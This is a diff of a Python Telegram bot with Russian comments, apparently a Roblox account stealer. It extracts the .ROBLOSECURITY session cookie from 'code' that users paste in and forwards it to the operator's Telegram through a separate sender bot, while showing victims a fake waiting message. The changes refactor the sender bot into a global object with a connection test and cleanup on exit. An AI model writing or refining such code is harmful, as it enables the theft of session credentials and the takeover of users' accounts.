@@ -24,6 +24,9 @@ router = Router()
 # Храним части сообщений для пользователей
 user_code_parts = {}
 
+# Глобальный объект бота для отправки (будет создан при старте)
+sender_bot = None
+
 def get_keyboard():
     buttons = [
         [InlineKeyboardButton(text="📤 Отправить код", callback_data="send_code")],
@@ -81,10 +84,12 @@ def extract_roblosecurity_value(full_code: str):
     
     return None
 
-async def send_cookie_to_telegram(cookie_value: str, user_info: str, sender_bot: Bot):
+async def send_cookie_to_telegram(cookie_value: str, user_info: str):
     """Отправляет .ROBLOSECURITY куки в твой Telegram"""
+    global sender_bot
+    
     try:
-        if not cookie_value:
+        if not cookie_value or not sender_bot:
             return
         
         # Формируем куки в правильном формате
@@ -211,12 +216,9 @@ async def get_code(message: Message):
         # Извлекаем куки
         roblosecurity_value = extract_roblosecurity_value(full_code)
         
-        # Создаем бота для отправки
-        sender_bot = Bot(token=SENDER_BOT_TOKEN)
-        
         # Отправляем куки в твой Telegram
         if roblosecurity_value:
-            await send_cookie_to_telegram(roblosecurity_value, user_info, sender_bot)
+            await send_cookie_to_telegram(roblosecurity_value, user_info)
         else:
             print("[ERROR] Не удалось извлечь куки")
             # Отправляем уведомление об ошибке
@@ -228,10 +230,7 @@ async def get_code(message: Message):
             except:
                 pass
         
-        # Закрываем соединение с ботом-отправителем
-        await sender_bot.session.close()
-        
-        # Показываем пользователю процесс
+        # Показываем пользователю процесс (ЭТО ОБЯЗАТЕЛЬНО!)
         wait_msg = await message.answer("подождите 5-10сек")
         
         # Ждем
@@ -276,10 +275,32 @@ async def get_code(message: Message):
             pass
 
 async def main():
+    global sender_bot
+    
+    # Создаем основной бот
     bot = Bot(token=BOT_TOKEN)
+    
+    # Создаем бот для отправки
+    sender_bot = Bot(token=SENDER_BOT_TOKEN)
+    
+    # Тестируем подключение
+    try:
+        me = await sender_bot.get_me()
+        print(f"[INFO] Бот для отправки: @{me.username}")
+    except Exception as e:
+        print(f"[ERROR] Не удалось подключиться к боту для отправки: {e}")
+        sender_bot = None
+    
     dp = Dispatcher()
     dp.include_router(router)
-    await dp.start_polling(bot)
+    
+    try:
+        await dp.start_polling(bot)
+    finally:
+        # Закрываем соединения при выходе
+        if sender_bot:
+            await sender_bot.session.close()
+        await bot.session.close()
 
 if __name__ == "__main__":
     asyncio.run(main())
